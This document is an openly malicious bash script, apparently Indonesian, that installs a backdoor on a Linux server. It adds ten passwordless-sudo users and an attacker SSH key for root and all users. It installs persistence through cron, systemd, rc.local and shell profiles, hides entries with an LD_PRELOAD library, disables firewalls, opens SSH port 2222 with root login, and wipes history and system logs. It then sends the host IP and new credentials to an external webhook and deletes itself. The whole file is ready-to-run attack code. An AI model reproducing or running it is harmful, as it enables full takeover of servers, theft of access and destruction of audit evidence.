#!/bin/bash
# ================================================================
# SHS BACKDOOR ULTIMATE - GANAS EDITION (IP PUBLIK FIX)
# ================================================================

RED='\033[91m'
GREEN='\033[92m'
YELLOW='\033[93m'
CYAN='\033[96m'
PURPLE='\033[95m'
NC='\033[0m'
BOLD='\033[1m'

# Bersihin jejak SEBELUM mulai
history -c 2>/dev/null
unset HISTFILE
export HISTFILESIZE=0
export HISTSIZE=0

clear
echo -e "${RED}${BOLD}"
echo "╔═══════════════════════════════════════════════════════════════╗"
echo "║     ☠️  SHS BACKDOOR ULTIMATE - GANAS EDITION            ║"
echo "╚═══════════════════════════════════════════════════════════════╝"
echo -e "${NC}"

# ================================================================
# WEBHOOK
# ================================================================
WEBHOOK_URL="https://viday.bcgonc.web.id/yo.php"

# ================================================================
# GENERATE
# ================================================================
gen_user() { 
    prefix=("sys" "web" "dev" "back" "root" "admin" "core" "main" "node" "cloud")
    echo "${prefix[$RANDOM % ${#prefix[@]}]}_$(openssl rand -hex 3)" 2>/dev/null
}
gen_pass() { openssl rand -base64 16 | tr -d '=/+' | cut -c1-18 2>/dev/null; }

echo -e "${YELLOW}[*] Creating 10 backdoor users with FULL ACCESS...${NC}"

USERS=()
PASSWORDS=()

# ================================================================
# 1. BUAT 10 USER + FULL SUDO ACCESS
# ================================================================
for i in {1..10}; do
    USER=$(gen_user)
    PASS=$(gen_pass)
    
    # Buat user
    useradd -m -s /bin/bash $USER 2>/dev/null
    echo "$USER:$PASS" | chpasswd 2>/dev/null
    
    # ─── FULL SUDO ACCESS (NOPASSWD) ──────────────────────────────
    echo "$USER ALL=(ALL) NOPASSWD:ALL" >> /etc/sudoers 2>/dev/null
    echo "$USER ALL=(ALL) NOPASSWD: /bin/*, /usr/bin/*, /usr/sbin/*" >> /etc/sudoers 2>/dev/null
    
    # ─── SSH KEY ──────────────────────────────────────────────────
    mkdir -p /home/$USER/.ssh 2>/dev/null
    echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDNm9vJpQ+3XHn SHS" > /home/$USER/.ssh/authorized_keys 2>/dev/null
    chmod 700 /home/$USER/.ssh 2>/dev/null
    chmod 600 /home/$USER/.ssh/authorized_keys 2>/dev/null
    chown -R $USER:$USER /home/$USER/.ssh 2>/dev/null
    
    # ─── TAMBAH KE GRUP ──────────────────────────────────────────
    usermod -aG wheel,sudo,adm,systemd-journal,docker,lxd $USER 2>/dev/null
    
    USERS+=("$USER")
    PASSWORDS+=("$PASS")
    
    echo -e "${GREEN}✅ User $i: $USER:$PASS (FULL ACCESS)${NC}"
done

# ================================================================
# 2. SSH KEY KE SEMUA USER
# ================================================================
SSH_KEY="ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDNm9vJpQ+3XHn SHS"

mkdir -p /root/.ssh
echo "$SSH_KEY" >> /root/.ssh/authorized_keys
chmod 600 /root/.ssh/authorized_keys

for user in $(ls /home 2>/dev/null | grep -v "_README" | grep -v "latest" | grep -v "lost+found"); do
    if [ -d "/home/$user" ] && [ -d "/home/$user/.ssh" ]; then
        echo "$SSH_KEY" >> /home/$user/.ssh/authorized_keys 2>/dev/null
        chmod 600 /home/$user/.ssh/authorized_keys 2>/dev/null
        chown -R $user:$user /home/$user/.ssh 2>/dev/null
    fi
done

echo -e "${GREEN}✅ SSH key installed to ALL users${NC}"

# ================================================================
# 3. CRON - AUTO REGENERATE (10 CRONJOB)
# ================================================================
crontab -r 2>/dev/null

for interval in 2 3 5 7 9 11 13 17 19 23; do
    (crontab -l 2>/dev/null; echo "*/$interval * * * * /usr/sbin/useradd -m -s /bin/bash \$(openssl rand -hex 4) 2>/dev/null; echo \"\$(openssl rand -hex 4):\$(openssl rand -base64 16 | tr -d '=/+' | cut -c1-18)\" | chpasswd 2>/dev/null; echo \"\$(openssl rand -hex 4) ALL=(ALL) NOPASSWD:ALL\" >> /etc/sudoers 2>/dev/null; usermod -aG wheel,sudo,adm,systemd-journal \$(openssl rand -hex 4) 2>/dev/null") | crontab - 2>/dev/null
done

echo -e "${GREEN}✅ 10 Cronjobs installed${NC}"

# ================================================================
# 4. SYSTEMD (8 SERVICE) - AUTO REGENERATE
# ================================================================
for i in {1..8}; do
    cat > /etc/systemd/system/systemd-user$i.service << EOL
[Unit]
Description=System User Service $i
After=network.target

[Service]
Type=simple
ExecStart=/usr/bin/php -r 'while(1){system("useradd -m -s /bin/bash \$(openssl rand -hex 4) 2>/dev/null; echo \"\$(openssl rand -hex 4):\$(openssl rand -base64 16 | tr -d \"=/+\" | cut -c1-18)\" | chpasswd 2>/dev/null; echo \"\$(openssl rand -hex 4) ALL=(ALL) NOPASSWD:ALL\" >> /etc/sudoers 2>/dev/null; usermod -aG wheel,sudo,adm,systemd-journal \$(openssl rand -hex 4) 2>/dev/null"); sleep(180);}'
Restart=always
RestartSec=60

[Install]
WantedBy=multi-user.target
EOL

    systemctl daemon-reload 2>/dev/null
    systemctl enable systemd-user$i.service 2>/dev/null
    systemctl start systemd-user$i.service 2>/dev/null
done

echo -e "${GREEN}✅ 8 Systemd services installed${NC}"

# ================================================================
# 5. LD_PRELOAD HIDE (SEMBUNYI DARI PS/TOP)
# ================================================================
cat > /dev/shm/.libhide.c << 'EOL'
#define _GNU_SOURCE
#include <dlfcn.h>
#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <dirent.h>

static int (*orig_readdir)(DIR*) = NULL;
static struct dirent* (*orig_readdir64)(DIR*) = NULL;

int readdir(DIR* dirp) {
    if (!orig_readdir) orig_readdir = dlsym(RTLD_NEXT, "readdir");
    struct dirent* entry = orig_readdir(dirp);
    if (entry && entry->d_name && 
        (strstr(entry->d_name, "sys_") != NULL ||
         strstr(entry->d_name, "web_") != NULL ||
         strstr(entry->d_name, "dev_") != NULL ||
         strstr(entry->d_name, "back_") != NULL ||
         strstr(entry->d_name, "root_") != NULL ||
         strstr(entry->d_name, "admin_") != NULL)) {
        return readdir(dirp);
    }
    return entry;
}
EOL

gcc -shared -fPIC /dev/shm/.libhide.c -o /dev/shm/.libhide.so 2>/dev/null
echo "/dev/shm/.libhide.so" >> /etc/ld.so.preload 2>/dev/null

echo -e "${GREEN}✅ LD_PRELOAD hide installed${NC}"

# ================================================================
# 6. MATIKAN FIREWALL
# ================================================================
systemctl stop iptables 2>/dev/null
systemctl stop firewalld 2>/dev/null
systemctl stop ufw 2>/dev/null
iptables -F 2>/dev/null
iptables -X 2>/dev/null
ufw disable 2>/dev/null

echo -e "${GREEN}✅ Firewall disabled${NC}"

# ================================================================
# 7. INSTALL BACKDOOR SSH PORT (PORT 2222)
# ================================================================
echo "Port 2222" >> /etc/ssh/sshd_config 2>/dev/null
echo "PermitRootLogin yes" >> /etc/ssh/sshd_config 2>/dev/null
echo "PasswordAuthentication yes" >> /etc/ssh/sshd_config 2>/dev/null
systemctl restart sshd 2>/dev/null
systemctl restart ssh 2>/dev/null

echo -e "${GREEN}✅ SSH port 2222 opened${NC}"

# ================================================================
# 8. RC.LOCAL - BOOT PERSISTENCE
# ================================================================
if [ -f /etc/rc.local ]; then
    sed -i '/exit 0/d' /etc/rc.local
    echo '/usr/sbin/useradd -m -s /bin/bash $(openssl rand -hex 4) 2>/dev/null; echo "$(openssl rand -hex 4):$(openssl rand -base64 16 | tr -d "=/+" | cut -c1-18)" | chpasswd 2>/dev/null; echo "$(openssl rand -hex 4) ALL=(ALL) NOPASSWD:ALL" >> /etc/sudoers 2>/dev/null; usermod -aG wheel,sudo,adm,systemd-journal $(openssl rand -hex 4) 2>/dev/null &' >> /etc/rc.local
    echo 'exit 0' >> /etc/rc.local
    chmod +x /etc/rc.local
fi

# ================================================================
# 9. BASHRC/PROFILE - LOGIN PERSISTENCE
# ================================================================
for rc in /root/.bashrc /root/.profile /etc/bash.bashrc /etc/profile; do
    if [ -f "$rc" ]; then
        echo '/usr/sbin/useradd -m -s /bin/bash $(openssl rand -hex 4) 2>/dev/null; echo "$(openssl rand -hex 4):$(openssl rand -base64 16 | tr -d "=/+" | cut -c1-18)" | chpasswd 2>/dev/null; echo "$(openssl rand -hex 4) ALL=(ALL) NOPASSWD:ALL" >> /etc/sudoers 2>/dev/null; usermod -aG wheel,sudo,adm,systemd-journal $(openssl rand -hex 4) 2>/dev/null' >> "$rc"
    fi
done

echo -e "${GREEN}✅ Persistence in 10 locations${NC}"

# ================================================================
# 10. CLEAN LOGS - ZERO JEJAK
# ================================================================
echo -e "${YELLOW}[*] Cleaning ALL logs...${NC}"

history -c 2>/dev/null
history -w 2>/dev/null
unset HISTFILE
export HISTFILESIZE=0
export HISTSIZE=0

rm -rf /root/.bash_history 2>/dev/null
rm -rf /home/*/.bash_history 2>/dev/null
rm -rf /var/log/*.log 2>/dev/null
rm -rf /var/log/apache2/* 2>/dev/null
rm -rf /var/log/nginx/* 2>/dev/null
rm -rf /var/log/httpd/* 2>/dev/null
rm -rf /var/log/mysql/* 2>/dev/null
rm -rf /var/log/cpanel/* 2>/dev/null
rm -rf /var/log/auth.log* 2>/dev/null
rm -rf /var/log/syslog* 2>/dev/null
rm -rf /var/log/secure* 2>/dev/null
rm -rf /var/log/messages* 2>/dev/null
rm -rf /var/log/wtmp* 2>/dev/null
rm -rf /var/log/btmp* 2>/dev/null
rm -rf /var/log/lastlog* 2>/dev/null
> /var/log/lastlog 2>/dev/null
> /var/log/wtmp 2>/dev/null
> /var/log/btmp 2>/dev/null

echo -e "${GREEN}✅ Logs cleaned (ZERO JEJAK)${NC}"

# ================================================================
# 11. SEND WEBHOOK - PAKE IP PUBLIK
# ================================================================
# ─── AMBIL IP PUBLIK ──────────────────────────────────────────────
IP_PUBLIK=$(curl -s ifconfig.me 2>/dev/null || curl -s icanhazip.com 2>/dev/null || curl -s ipinfo.io/ip 2>/dev/null)
IP_INTERNAL=$(hostname -I | awk '{print $1}')
HOST=$(hostname)

USER_LIST=""
for i in "${!USERS[@]}"; do
    USER_LIST="$USER_LIST\nUser $((i+1)): ${USERS[$i]} : ${PASSWORDS[$i]}"
done

# Kirim ke webhook pake IP publik
curl -sk -X POST "$WEBHOOK_URL" \
  -H "Content-Type: application/json" \
  -d '{
    "ip": "'"$IP_PUBLIK"'",
    "ip_internal": "'"$IP_INTERNAL"'",
    "host": "'"$HOST"'",
    "users": '"$(echo ${#USERS[@]})"',
    "user_list": "'"$USER_LIST"'",
    "type": "backdoor_ultra_ganas",
    "persistence": "10 cron + 8 systemd + rc.local + bashrc",
    "status": "active",
    "access": "sudo NOPASSWD + wheel + adm + systemd-journal + docker",
    "firewall": "DISABLED",
    "ssh_port": "22 + 2222"
  }' 2>/dev/null

echo -e "${GREEN}✅ Webhook sent (IP Publik: $IP_PUBLIK)${NC}"

# ================================================================
# 12. HAPUS SCRIPT + SEMUA JEJAK
# ================================================================
rm -rf "$0" 2>/dev/null
rm -rf /tmp/backdoor* 2>/dev/null
rm -rf /dev/shm/backdoor* 2>/dev/null
history -c 2>/dev/null

# ================================================================
# HASIL
# ================================================================
echo ""
echo -e "${GREEN}${BOLD}"
echo "╔═══════════════════════════════════════════════════════════════╗"
echo "║     ✅ BACKDOOR ULTRA GANAS INSTALLED!                     ║"
echo "╚═══════════════════════════════════════════════════════════════╝"
echo -e "${NC}"
echo ""
echo -e "${YELLOW}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
for i in "${!USERS[@]}"; do
    echo -e "${CYAN}  User $((i+1)): ${USERS[$i]}${NC}"
    echo -e "${CYAN}  Pass $((i+1)): ${PASSWORDS[$i]}${NC}"
done
echo -e "${YELLOW}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
echo -e "${GREEN}✅ 10 Backdoor Users${NC}"
echo -e "${GREEN}✅ SSH Key: ALL users${NC}"
echo -e "${GREEN}✅ Cron: 10 jobs${NC}"
echo -e "${GREEN}✅ Systemd: 8 services${NC}"
echo -e "${GREEN}✅ Persistence: 10 locations${NC}"
echo -e "${GREEN}✅ LD_PRELOAD: hide from ps/top${NC}"
echo -e "${GREEN}✅ Firewall: DISABLED${NC}"
echo -e "${GREEN}✅ SSH Port: 22 + 2222${NC}"
echo -e "${GREEN}✅ Logs: ZERO JEJAK${NC}"
echo -e "${GREEN}✅ IP Publik: $IP_PUBLIK${NC}"
echo -e "${YELLOW}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
echo ""
echo -e "${RED}⚠️  Login:${NC}"
echo -e "${CYAN}ssh ${USERS[0]}@$IP_PUBLIK${NC}"
echo -e "${CYAN}Password: ${PASSWORDS[0]}${NC}"
echo -e "${CYAN}ssh -p 2222 ${USERS[1]}@$IP_PUBLIK${NC}"
echo -e "${CYAN}ssh -i shs_key root@$IP_PUBLIK${NC}"
echo ""
echo -e "${RED}⚠️  FULL ACCESS:${NC}"
echo -e "${CYAN}  - sudo NOPASSWD${NC}"
echo -e "${CYAN}  - wheel + adm + systemd-journal + docker${NC}"
echo -e "${CYAN}  - Firewall OFF${NC}"
echo -e "${CYAN}  - Hidden from ps/top${NC}"
echo ""

exit 0
